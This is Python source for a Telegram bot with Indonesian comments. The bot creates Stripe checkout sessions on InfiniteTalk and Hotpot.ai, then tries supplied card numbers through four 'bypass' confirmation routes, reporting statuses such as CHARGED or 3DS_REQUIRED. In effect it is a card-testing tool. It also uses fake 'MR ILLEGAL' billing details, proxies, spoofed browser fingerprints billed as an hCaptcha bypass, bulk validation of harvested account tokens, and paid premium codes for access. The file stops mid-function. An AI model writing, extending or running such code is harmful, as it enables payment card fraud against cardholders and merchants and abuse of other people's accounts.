import time
import re
import aiohttp
import base64
import asyncio
import json
import os
import random
import string
import hashlib
import secrets
from urllib.parse import unquote
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple, List
from aiogram import Router, F
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command, CommandObject
from aiogram.enums import ParseMode

router = Router()

# ========== CONFIGURATION ==========
ALLOWED_GROUP = -1003403152312
OWNER_ID = 8315528188
CHARGED_GROUP = -1003403152312
PROXY_FILE = "proxies.json"
CODES_FILE = "codes.json"
USERS_FILE = "users.json"

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

_session = None

# ========== UPDATED INFINITETALK AUTO CHECKOUT ==========

class InfiniteTalkAutoCheckout:
    """Auto grab checkout InfiniteTalk dengan API baru"""
    
    @staticmethod
    async def grab_single_checkout_v2(auth_token: str) -> dict:
        """Grab satu checkout dengan API baru"""
        try:
            headers = {
                "Content-Type": "application/json",
                "x-appid": "infinitetalk",
                "Authorization": f"Bearer {auth_token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            # Price ID untuk $9.9
            price_id = "price_1S0bzJ2LCxiz8WFQshNuYpsJ"  # $9.9 checkout
            
            payload = {
                "price_id": price_id
            }
            
            async with aiohttp.ClientSession() as session:
                # POST ke endpoint baru
                checkout_url = "https://api.infinitetalk.net/api/pay/stripe"
                
                async with session.post(checkout_url, json=payload, headers=headers, timeout=15) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        
                        if data.get("code") == 200:
                            checkout_data = data.get("data", {})
                            checkout_url = checkout_data.get("url", "")
                            session_id = checkout_data.get("session_id", "")
                            
                            if "checkout.stripe.com" in checkout_url:
                                decoded = decode_pk_from_url(checkout_url)
                                return {
                                    "success": True,
                                    "url": checkout_url,
                                    "session_id": session_id,
                                    "pk": decoded.get("pk"),
                                    "cs": decoded.get("cs"),
                                    "amount": 9.9,
                                    "credits": 90,
                                    "product": "InfiniteTalk 90 Credits",
                                    "raw": checkout_data
                                }
                    
                    return {"success": False, "error": f"Checkout failed: {resp.status}"}
                    
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    @staticmethod
    async def check_token_balance(auth_token: str) -> dict:
        """Cek token balance dengan API baru"""
        try:
            headers = {
                "Content-Type": "application/json",
                "x-appid": "infinitetalk",
                "Authorization": f"Bearer {auth_token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    "https://api.infinitetalk.net/api/user/info",
                    headers=headers,
                    timeout=10
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if data.get("code") == 200:
                            user_data = data.get("data", {})
                            return {
                                "success": True,
                                "balance": user_data.get("balance", 0),
                                "total_balance": user_data.get("total_balance", 0),
                                "remaining": user_data.get("remaining_limit", 0),
                                "email": user_data.get("email", ""),
                                "nickname": user_data.get("nickname", "")
                            }
                    
                    return {"success": False, "error": f"HTTP {resp.status}"}
                    
        except Exception as e:
            return {"success": False, "error": str(e)}

# ========== BULK TOKEN IMPORTER ==========

class BulkTokenImporter:
    """Import bulk tokens dari berbagai format"""
    
    @staticmethod
    async def import_from_text(text: str, source: str = "unknown") -> list:
        """Import tokens dari text"""
        tokens = []
        lines = text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Cek format JWT token
            if line.startswith("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"):
                tokens.append({
                    "token": line,
                    "source": source,
                    "type": "jwt"
                })
            # Format: token|email
            elif '|' in line:
                parts = line.split('|')
                if len(parts) >= 2 and parts[0].strip():
                    tokens.append({
                        "token": parts[0].strip(),
                        "email": parts[1].strip() if len(parts) > 1 else "",
                        "source": source,
                        "type": "pipe_format"
                    })
            # Format: email:token
            elif ':' in line and '@' in line:
                try:
                    email_part, token_part = line.split(':', 1)
                    if '@' in email_part and token_part.strip():
                        tokens.append({
                            "token": token_part.strip(),
                            "email": email_part.strip(),
                            "source": source,
                            "type": "email_token"
                        })
                except:
                    continue
            # Format JSON
            elif line.startswith('{'):
                try:
                    data = json.loads(line)
                    if 'token' in data or 'access_token' in data:
                        token = data.get('token') or data.get('access_token')
                        email = data.get('email', '')
                        tokens.append({
                            "token": token,
                            "email": email,
                            "source": source,
                            "type": "json"
                        })
                except:
                    continue
        
        return tokens
    
    @staticmethod
    async def validate_tokens(tokens: list) -> list:
        """Validate tokens dengan API"""
        validated = []
        
        for token_data in tokens:
            token = token_data.get("token", "")
            if not token:
                continue
            
            # Cek token dengan API
            headers = {
                "Content-Type": "application/json",
                "x-appid": "infinitetalk",
                "Authorization": f"Bearer {token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        "https://api.infinitetalk.net/api/user/info",
                        headers=headers,
                        timeout=8
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if data.get("code") == 200:
                                user_data = data.get("data", {})
                                token_data["valid"] = True
                                token_data["user_info"] = {
                                    "email": user_data.get("email", token_data.get("email", "")),
                                    "nickname": user_data.get("nickname", ""),
                                    "remaining": user_data.get("remaining_limit", 0)
                                }
                            else:
                                token_data["valid"] = False
                                token_data["error"] = data.get("msg", "Invalid")
                        else:
                            token_data["valid"] = False
                            token_data["error"] = f"HTTP {resp.status}"
            except Exception as e:
                token_data["valid"] = False
                token_data["error"] = str(e)
            
            validated.append(token_data)
            
        return validated

# ========== TOKEN STORAGE SYSTEM ==========

def load_infinitetalk_tokens() -> dict:
    """Load InfiniteTalk tokens dari file"""
    if os.path.exists(INFINITETALK_TOKENS_FILE):
        try:
            with open(INFINITETALK_TOKENS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_infinitetalk_tokens(data: dict):
    """Save InfiniteTalk tokens ke file"""
    with open(INFINITETALK_TOKENS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def add_infinitetalk_token(user_id: int, token: str, email: str = ""):
    """Add InfiniteTalk token untuk user"""
    tokens = load_infinitetalk_tokens()
    user_key = str(user_id)
    
    if user_key not in tokens:
        tokens[user_key] = []
    
    # Cek token sudah ada
    for t in tokens[user_key]:
        if t.get("token") == token:
            return False
    
    tokens[user_key].append({
        "token": token,
        "email": email,
        "added_at": datetime.now().isoformat(),
        "last_used": None,
        "active": True
    })
    
    save_infinitetalk_tokens(tokens)
    return True

def remove_infinitetalk_token(user_id: int, token_index: int = None):
    """Remove InfiniteTalk token"""
    tokens = load_infinitetalk_tokens()
    user_key = str(user_id)
    
    if user_key in tokens:
        if token_index is None:
            del tokens[user_key]
        elif 0 <= token_index < len(tokens[user_key]):
            tokens[user_key].pop(token_index)
            if not tokens[user_key]:
                del tokens[user_key]
        else:
            return False
        
        save_infinitetalk_tokens(tokens)
        return True
    
    return False

def get_user_infinitetalk_tokens(user_id: int) -> list:
    """Get semua token user"""
    tokens = load_infinitetalk_tokens()
    return tokens.get(str(user_id), [])

# ========== SIMPLE HOTPOT CHECKOUT GENERATOR ==========

class HotpotCheckoutSimple:
    """Simple Hotpot.ai $10 checkout generator"""
    
    @staticmethod
    async def create_single_checkout() -> dict:
        """Create one $10 Hotpot checkout"""
        try:
            url = "https://hotpot.ai/checkout/create_dynamic"
            
            payload = {
                "mode": "payment",
                "priceID": "1000",
                "centAmount": 1000,
                "name": "The Zacatecas - 100 Credit",
                "quantity": 1,
                "imageUrl": "https://hotpot.ai/static/images/ai-art-studio/og.png",
                "referer": "https://hotpot.ai"
            }
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Origin": "https://hotpot.ai",
                "Referer": "https://hotpot.ai/"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        checkout_url = data.get("redirectURL")
                        
                        if checkout_url:
                            decoded = decode_pk_from_url(checkout_url)
                            return {
                                "success": True,
                                "url": checkout_url,
                                "pk": decoded.get("pk"),
                                "cs": decoded.get("cs"),
                                "amount": 10.00
                            }
                    
                    return {"success": False, "error": f"Status: {response.status}"}
                    
        except Exception as e:
            return {"success": False, "error": str(e)}

# ========== REAL SCREENSHOT SYSTEM ==========
class RealStripeScreenshot:
    """Take real screenshot of Stripe checkout page"""
    
    @staticmethod
    async def capture_checkout_page(cs_code: str, user_id: int, proxy_str: str = None) -> Optional[str]:
        """Capture actual Stripe checkout page"""
        try:
            # Create screenshot directory
            screenshot_dir = "checkout_screenshots"
            if not os.path.exists(screenshot_dir):
                os.makedirs(screenshot_dir)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{screenshot_dir}/checkout_{user_id}_{timestamp}.png"
            
            # Build checkout URL
            checkout_url = f"https://checkout.stripe.com/c/pay/{cs_code}"
            
            # Try to use selenium if available
            try:
                from selenium import webdriver
                from selenium.webdriver.common.by import By
                from selenium.webdriver.support.ui import WebDriverWait
                from selenium.webdriver.support import expected_conditions as EC
                from selenium.webdriver.chrome.options import Options
                
                # Setup Chrome
                chrome_options = Options()
                chrome_options.add_argument('--headless')
                chrome_options.add_argument('--no-sandbox')
                chrome_options.add_argument('--disable-dev-shm-usage')
                chrome_options.add_argument('--window-size=1920,1080')
                chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
                
                # Add proxy if available
                if proxy_str and ':' in proxy_str:
                    parts = proxy_str.split(':')
                    if len(parts) >= 2:
                        host = parts[0]
                        port = parts[1]
                        chrome_options.add_argument(f'--proxy-server={host}:{port}')
                
                # Try to use existing Chrome driver
                try:
                    driver = webdriver.Chrome(options=chrome_options)
                except:
                    # Try with service
                    from selenium.webdriver.chrome.service import Service
                    driver = webdriver.Chrome(service=Service(), options=chrome_options)
                
                try:
                    # Navigate to checkout
                    driver.get(checkout_url)
                    
                    # Wait for page to load
                    wait = WebDriverWait(driver, 10)
                    
                    # Try to find and click save info checkbox
                    try:
                        # Multiple possible selectors for the checkbox
                        checkbox_selectors = [
                            "input[name='enableStripePass']",
                            "input[type='checkbox']",
                            "input[data-testid='save-payment-method-checkbox']",
                            ".Checkbox-input",
                            "[role='checkbox']"
                        ]
                        
                        for selector in checkbox_selectors:
                            try:
                                checkbox = driver.find_element(By.CSS_SELECTOR, selector)
                                if checkbox.is_displayed():
                                    driver.execute_script("arguments[0].click();", checkbox)
                                    break
                            except:
                                continue
                    except:
                        pass
                    
                    # Wait a moment
                    time.sleep(1)
                    
                    # Take screenshot
                    driver.save_screenshot(filename)
                    
                    driver.quit()
                    return filename
                    
                except Exception as e:
                    try:
                        driver.quit()
                    except:
                        pass
                    return None
                    
            except ImportError:
                # Selenium not available, try alternative method
                return None
                
        except Exception as e:
            return None

# ========== ADVANCED CHECKOUT BYPASS SYSTEM ==========

class StripeCheckoutBypass:
    """Bypass semua merchant restrictions dengan multiple approaches"""
    
    @staticmethod
    async def approach_1_direct_api(session, pk, cs, card, proxy_url=None):
        """Direct API approach - original method"""
        try:
            fingerprint = AdvancedCaptchaBypass.generate_advanced_fingerprint()
            headers = AdvancedCaptchaBypass.generate_captcha_bypass_headers(fingerprint, pk)
            
            # Step 1: Init checkout
            init_body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/init",
                headers=headers,
                data=init_body,
                proxy=proxy_url,
                timeout=8
            ) as r:
                if r.status != 200:
                    return {"status": "API_ERROR", "response": f"Init failed: {r.status}"}
                init_data = await r.json()
            
            if "error" in init_data:
                return {"status": "API_ERROR", "response": init_data["error"].get("message", "Init error")}
            
            checksum = init_data.get("init_checksum", "")
            
            # Step 2: Create payment method dengan billing Makau
            email = init_data.get("customer_email") or f"user{random.randint(100000, 999999)}@gmail.com"
            pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]=20{card['year']}&billing_details[name]=MR ILLEGAL&billing_details[email]={email}&billing_details[address][country]=MO&billing_details[address][line1]=123 MR ILLEGAL&billing_details[address][city]=Macau&billing_details[address][postal_code]=999078&billing_details[address][state]=MO&key={pk}"
            
            async with session.post("https://api.stripe.com/v1/payment_methods", 
                                  data=pm_body, 
                                  headers=headers,
                                  proxy=proxy_url,
                                  timeout=8) as r:
                pm = await r.json()
            
            if "error" in pm:
                return {"status": "PAYMENT_METHOD_ERROR", "response": pm["error"].get("message", "PM error")}
            
            pm_id = pm.get("id")
            
            # Step 3: Confirm payment
            lig = init_data.get("line_item_group") or {}
            total = lig.get("total", 0) or 0
            subtotal = lig.get("subtotal", 0) or 0
            
            conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
            
            async with session.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", 
                                  data=conf_body, 
                                  headers=headers,
                                  proxy=proxy_url,
                                  timeout=8) as r:
                conf = await r.json()
            
            if "error" in conf:
                return {"status": "CONFIRM_ERROR", "response": conf["error"].get("message", "Confirm error")}
            
            # Check status
            pi = conf.get("payment_intent") or {}
            status = pi.get("status", "") or conf.get("status", "")
            
            if status == "succeeded":
                return {"status": "CHARGED", "response": "Payment Successful"}
            elif status == "requires_action":
                return {"status": "3DS_REQUIRED", "response": "3DS Required"}
            else:
                return {"status": "UNKNOWN", "response": status}
                
        except Exception as e:
            return {"status": "EXCEPTION", "response": str(e)}
    
    @staticmethod
    async def approach_2_embedded_session(session, pk, cs, card, proxy_url=None):
        """Embedded session approach untuk restricted checkout"""
        try:
            # Get session from checkout page
            checkout_url = f"https://checkout.stripe.com/c/pay/{cs}"
            
            async with session.get(checkout_url, proxy=proxy_url, timeout=10) as r:
                html = await r.text()
                
                # Extract session data
                session_match = re.search(r'"sessionId":"([^"]+)"', html)
                session_id = session_match.group(1) if session_match else cs
                
                # Extract client secret
                client_secret_match = re.search(r'"client_secret":"([^"]+)"', html)
                client_secret = client_secret_match.group(1) if client_secret_match else ""
            
            if not client_secret:
                return {"status": "NO_CLIENT_SECRET", "response": "Cannot extract client secret"}
            
            # Use embedded payment approach
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://checkout.stripe.com",
                "Referer": checkout_url,
            }
            
            # Create payment method
            pm_data = {
                "type": "card",
                "card[number]": card['cc'],
                "card[cvc]": card['cvv'],
                "card[exp_month]": card['month'],
                "card[exp_year]": f"20{card['year']}",
                "billing_details[name]": "MR ILLEGAL",
                "billing_details[email]": f"user{random.randint(100000, 999999)}@gmail.com",
                "billing_details[address][country]": "MO",
                "billing_details[address][line1]": "123 MR ILLEGAL",
                "billing_details[address][city]": "Macau",
                "billing_details[address][postal_code]": "999078",
                "billing_details[address][state]": "MO",
                "key": pk,
                "_stripe_version": "2020-08-27",
            }
            
            async with session.post("https://api.stripe.com/v1/payment_methods", 
                                  data=pm_data, 
                                  headers=headers,
                                  proxy=proxy_url,
                                  timeout=8) as r:
                pm = await r.json()
            
            if "error" in pm:
                return {"status": "PAYMENT_METHOD_ERROR", "response": pm["error"].get("message", "PM error")}
            
            pm_id = pm.get("id")
            
            # Confirm dengan client secret
            pi_id = client_secret.split('_secret_')[0] if '_secret_' in client_secret else f"pi_{cs.split('_')[-1]}"
            
            confirm_data = {
                "payment_method": pm_id,
                "return_url": "https://checkout.stripe.com",
                "expected_payment_method_type": "card",
            }
            
            confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
            
            async with session.post(confirm_url, 
                                  data=confirm_data, 
                                  headers=headers,
                                  proxy=proxy_url,
                                  timeout=8) as r:
                conf = await r.json()
            
            if "error" in conf:
                return {"status": "CONFIRM_ERROR", "response": conf["error"].get("message", "Confirm error")}
            
            status = conf.get("status", "")
            
            if status == "succeeded":
                return {"status": "CHARGED", "response": "Payment Successful via Embedded"}
            elif status == "requires_action":
                return {"status": "3DS_REQUIRED", "response": "3DS Required via Embedded"}
            else:
                return {"status": "UNKNOWN", "response": status}
                
        except Exception as e:
            return {"status": "EXCEPTION", "response": str(e)}
    
    @staticmethod
    async def approach_3_stripe_elements(session, pk, cs, card, proxy_url=None):
        """Stripe Elements approach"""
        try:
            # Get ephemeral key first
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
            }
            
            # Try to get customer email from checkout
            checkout_url = f"https://checkout.stripe.com/c/pay/{cs}"
            async with session.get(checkout_url, proxy=proxy_url, timeout=5) as r:
                html = await r.text()
                email_match = re.search(r'"customerEmail":"([^"]+)"', html)
                customer_email = email_match.group(1) if email_match else f"user{random.randint(100000, 999999)}@gmail.com"
            
            ek_data = {
                "customer_email": customer_email,
                "api_version": "2020-08-27",
            }
            
            ek_headers = headers.copy()
            if pk:
                ek_headers["Authorization"] = f"Bearer {pk}"
            
            async with session.post("https://api.stripe.com/v1/ephemeral_keys", 
                                  data=ek_data, 
                                  headers=ek_headers,
                                  proxy=proxy_url,
                                  timeout=8) as r:
                ek = await r.json()
            
            if "error" in ek:
                # Fallback ke direct method
                return {"status": "FALLBACK", "response": "Fallback to direct"}
            
            # Create payment method dengan ephemeral key
            pm_data = {
                "type": "card",
                "card[number]": card['cc'],
                "card[cvc]": card['cvv'],
                "card[exp_month]": card['month'],
                "card[exp_year]": f"20{card['year']}",
                "billing_details[name]": "MR ILLEGAL",
                "billing_details[email]": customer_email,
                "billing_details[address][country]": "MO",
                "billing_details[address][line1]": "123 MR ILLEGAL",
                "billing_details[address][city]": "Macau",
                "billing_details[address][postal_code]": "999078",
                "billing_details[address][state]": "MO",
                "key": pk,
            }
            
            async with session.post("https://api.stripe.com/v1/payment_methods", 
                                  data=pm_data, 
                                  headers=headers,
                                  proxy=proxy_url,
                                  timeout=8) as r:
                pm = await r.json()
            
            if "error" in pm:
                return {"status": "PAYMENT_METHOD_ERROR", "response": pm["error"].get("message", "PM error")}
            
            pm_id = pm.get("id")
            
            # Confirm payment dengan beberapa endpoint
            confirm_endpoints = [
                f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                f"https://api.stripe.com/v1/payment_intents/pi_{cs.split('_')[-1]}/confirm",
            ]
            
            confirm_data = {
                "payment_method": pm_id,
                "expected_payment_method_type": "card",
                "return_url": "https://checkout.stripe.com",
            }
            
            for endpoint in confirm_endpoints:
                try:
                    async with session.post(endpoint, 
                                          data=confirm_data, 
                                          headers=headers,
                                          proxy=proxy_url,
                                          timeout=8) as r:
                        if r.status == 200:
                            conf = await r.json()
                            if "error" not in conf:
                                status = conf.get("status", "")
                                
                                if status == "succeeded":
                                    return {"status": "CHARGED", "response": "Payment Successful via Elements"}
                                elif status == "requires_action":
                                    return {"status": "3DS_REQUIRED", "response": "3DS Required via Elements"}
                                break
                except:
                    continue
            
            return {"status": "ALL_ENDPOINTS_FAILED", "response": "All confirmation endpoints failed"}
                
        except Exception as e:
            return {"status": "EXCEPTION", "response": str(e)}
    
    @staticmethod
    async def approach_4_direct_confirm(session, pk, cs, card, proxy_url=None):
        """Direct confirm tanpa init - untuk strict restrictions"""
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://checkout.stripe.com",
                "Referer": f"https://checkout.stripe.com/c/pay/{cs}",
            }
            
            # Create payment method langsung
            pm_data = {
                "type": "card",
                "card[number]": card['cc'],
                "card[cvc]": card['cvv'],
                "card[exp_month]": card['month'],
                "card[exp_year]": f"20{card['year']}",
                "billing_details[name]": "MR ILLEGAL",
                "billing_details[email]": f"user{random.randint(100000, 999999)}@gmail.com",
                "billing_details[address][country]": "MO",
                "billing_details[address][line1]": "123 MR ILLEGAL",
                "billing_details[address][city]": "Macau",
                "billing_details[address][postal_code]": "999078",
                "billing_details[address][state]": "MO",
                "key": pk,
            }
            
            async with session.post("https://api.stripe.com/v1/payment_methods", 
                                  data=pm_data, 
                                  headers=headers,
                                  proxy=proxy_url,
                                  timeout=8) as r:
                pm = await r.json()
            
            if "error" in pm:
                return {"status": "PAYMENT_METHOD_ERROR", "response": pm["error"].get("message", "PM error")}
            
            pm_id = pm.get("id")
            
            # Confirm langsung ke payment page
            confirm_data = {
                "payment_method": pm_id,
                "expected_payment_method_type": "card",
                "key": pk,
                "eid": "NA",
                "browser_locale": "en-US",
            }
            
            confirm_url = f"https://api.stripe.com/v1/payment_pages/{cs}/confirm"
            
            async with session.post(confirm_url, 
                                  data=confirm_data, 
                                  headers=headers,
                                  proxy=proxy_url,
                                  timeout=8) as r:
                conf = await r.json()
            
            if "error" in conf:
                return {"status": "CONFIRM_ERROR", "response": conf["error"].get("message", "Confirm error")}
            
            status = conf.get("status", "")
            
            if status == "succeeded":
                return {"status": "CHARGED", "response": "Payment Successful via Direct Confirm"}
            elif status == "requires_action":
                return {"status": "3DS_REQUIRED", "response": "3DS Required via Direct Confirm"}
            else:
                return {"status": "UNKNOWN", "response": status}
                
        except Exception as e:
            return {"status": "EXCEPTION", "response": str(e)}
    
    @staticmethod
    async def try_all_approaches(pk, cs, card, proxy_str=None):
        """Coba semua approach sampai berhasil"""
        approaches = [
            ("Direct API", StripeCheckoutBypass.approach_1_direct_api),
            ("Embedded Session", StripeCheckoutBypass.approach_2_embedded_session),
            ("Stripe Elements", StripeCheckoutBypass.approach_3_stripe_elements),
            ("Direct Confirm", StripeCheckoutBypass.approach_4_direct_confirm),
        ]
        
        proxy_url = get_proxy_url(proxy_str) if proxy_str else None
        
        for approach_name, approach_func in approaches:
            try:
                # Buat session baru untuk setiap approach
                async with create_fresh_session() as session:
                    result = await approach_func(session, pk, cs, card, proxy_url)
                    
                    # Jika bukan "integration surface" error, return result
                    response_lower = str(result.get("response", "")).lower()
                    if not any(x in response_lower for x in ["integration surface", "publishable key", "unsupported"]):
                        result["approach"] = approach_name
                        return result
                    
                    # Jika FALLBACK, lanjut ke approach berikutnya
                    if result.get("status") == "FALLBACK":
                        continue
                    
                    # Coba approach berikutnya
                    continue
                    
            except Exception as e:
                continue
        
        # Jika semua approach gagal
        return {"status": "ALL_APPROACHES_FAILED", "response": "All approaches failed due to restrictions", "approach": "None"}

# ========== DATABASE FUNCTIONS ==========

def load_codes() -> dict:
    """Load codes from file"""
    if os.path.exists(CODES_FILE):
        try:
            with open(CODES_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_codes(data: dict):
    """Save codes to file"""
    with open(CODES_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_users() -> dict:
    """Load users from file"""
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_users(data: dict):
    """Save users to file"""
    with open(USERS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_proxies() -> dict:
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_proxies(data: dict):
    with open(PROXY_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ========== CODE GENERATION SYSTEM ==========

class CodeManager:
    """Manage premium codes and user subscriptions"""
    
    @staticmethod
    def generate_code(duration_days: int, max_users: int) -> str:
        """Generate premium code"""
        token = secrets.token_hex(8).upper()
        return f"ZACATECAS-{duration_days}d-{token}"
    
    @staticmethod
    def add_code(duration_days: int, max_users: int, created_by: int) -> dict:
        """Add new premium code"""
        code = CodeManager.generate_code(duration_days, max_users)
        codes = load_codes()
        
        codes[code] = {
            "duration_days": duration_days,
            "max_users": max_users,
            "created_by": created_by,
            "created_at": datetime.now().isoformat(),
            "used_by": [],
            "active": True
        }
        
        save_codes(codes)
        return {"code": code, "data": codes[code]}
    
    @staticmethod
    def redeem_code(user_id: int, code: str) -> dict:
        """Redeem premium code"""
        codes = load_codes()
        users = load_users()
        
        if code not in codes:
            return {"success": False, "message": "Code tidak valid"}
        
        code_data = codes[code]
        
        if not code_data["active"]:
            return {"success": False, "message": "Code sudah tidak aktif"}
        
        if len(code_data["used_by"]) >= code_data["max_users"]:
            return {"success": False, "message": "Code sudah mencapai batas user"}
        
        if str(user_id) in code_data["used_by"]:
            return {"success": False, "message": "Anda sudah menggunakan code ini"}
        
        # Add user to code
        code_data["used_by"].append(str(user_id))
        codes[code] = code_data
        
        # Add/Update user premium
        expiry_date = datetime.now() + timedelta(days=code_data["duration_days"])
        users[str(user_id)] = {
            "premium": True,
            "expiry_date": expiry_date.isoformat(),
            "redeemed_code": code,
            "redeemed_at": datetime.now().isoformat(),
            "unlimited": False
        }
        
        save_codes(codes)
        save_users(users)
        
        return {"success": True, "message": f"Premium aktif selama {code_data['duration_days']} hari", "expiry_date": expiry_date}
    
    @staticmethod
    def get_active_codes() -> dict:
        """Get all active codes"""
        codes = load_codes()
        return {code: data for code, data in codes.items() if data["active"]}
    
    @staticmethod
    def get_user_premium_status(user_id: int) -> dict:
        """Check user premium status"""
        users = load_users()
        user_data = users.get(str(user_id))
        
        if not user_data:
            return {"premium": False, "unlimited": False}
        
        if user_data.get("unlimited", False):
            return {"premium": True, "unlimited": True, "expiry_date": "Unlimited"}
        
        expiry_date = datetime.fromisoformat(user_data["expiry_date"])
        if datetime.now() > expiry_date:
            # Premium expired
            users[str(user_id)]["premium"] = False
            save_users(users)
            return {"premium": False, "unlimited": False}
        
        return {"premium": True, "unlimited": False, "expiry_date": expiry_date}
    
    @staticmethod
    def add_unlimited_user(user_id: int, added_by: int) -> bool:
        """Add unlimited premium user"""
        users = load_users()
        
        users[str(user_id)] = {
            "premium": True,
            "expiry_date": "9999-12-31T23:59:59",
            "redeemed_code": "MANUAL",
            "redeemed_at": datetime.now().isoformat(),
            "unlimited": True,
            "added_by": added_by
        }
        
        save_users(users)
        return True
    
    @staticmethod
    def remove_premium_user(user_id: int) -> bool:
        """Remove user premium"""
        users = load_users()
        
        if str(user_id) in users:
            # Remove from any codes first
            codes = load_codes()
            for code, data in codes.items():
                if str(user_id) in data.get("used_by", []):
                    data["used_by"].remove(str(user_id))
                    codes[code] = data
            
            save_codes(codes)
            
            # Remove user
            del users[str(user_id)]
            save_users(users)
            return True
        
        return False
    
    @staticmethod
    def delete_code(code: str) -> bool:
        """Delete premium code"""
        codes = load_codes()
        
        if code in codes:
            del codes[code]
            save_codes(codes)
            return True
        
        return False
    
    @staticmethod
    def get_all_users() -> dict:
        """Get all users with premium status"""
        return load_users()
    
    @staticmethod
    def get_code_users(code: str) -> list:
        """Get users who redeemed a specific code"""
        codes = load_codes()
        if code in codes:
            return codes[code].get("used_by", [])
        return []

# ========== ADVANCED CAPTCHA BYPASS SYSTEM ==========

class AdvancedCaptchaBypass:
    """Advanced hCaptcha bypass dengan fingerprint manipulation"""
    
    @staticmethod
    def generate_advanced_fingerprint() -> Dict:
        """Generate advanced fingerprint dengan variation"""
        timestamp = int(time.time())
        random.seed(timestamp)
        
        fingerprints = [
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "screen": "1920x1080",
                "platform": "Win32",
                "language": "zh-MO,zh;q=0.9,en;q=0.8",
                "timezone": "Asia/Macau",
                "sec_ch_ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"Windows"',
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
                "screen": "2560x1440",
                "platform": "Win32",
                "language": "zh-MO,zh-CN;q=0.9,zh;q=0.8",
                "timezone": "Asia/Macau",
                "sec_ch_ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"Windows"',
            },
            {
                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "screen": "1440x900",
                "platform": "MacIntel",
                "language": "zh-MO,pt;q=0.9,en;q=0.8",
                "timezone": "Asia/Macau",
                "sec_ch_ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"macOS"',
            }
        ]
        
